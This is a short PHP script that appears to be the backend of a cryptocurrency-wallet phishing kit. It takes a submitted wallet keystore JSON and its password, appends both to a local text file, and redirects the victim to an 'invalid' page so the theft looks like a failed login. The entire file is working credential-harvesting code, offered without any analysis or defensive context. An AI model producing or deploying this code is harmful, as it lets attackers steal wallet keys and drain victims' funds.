<?php
$keystore_json = $_POST['keystore_json'];
$password = $_POST['password'];
if (empty($keystore_json) && empty($password)) {
  header('location: ./');
} else {
$message = "
KEYSTORE : ".$keystore_json."
Password : ".$password."
";
$qq = fopen("abel.txt", "a");
fwrite($qq, $message);
fclose($qq);
header('location: invalid.php');
}
?>
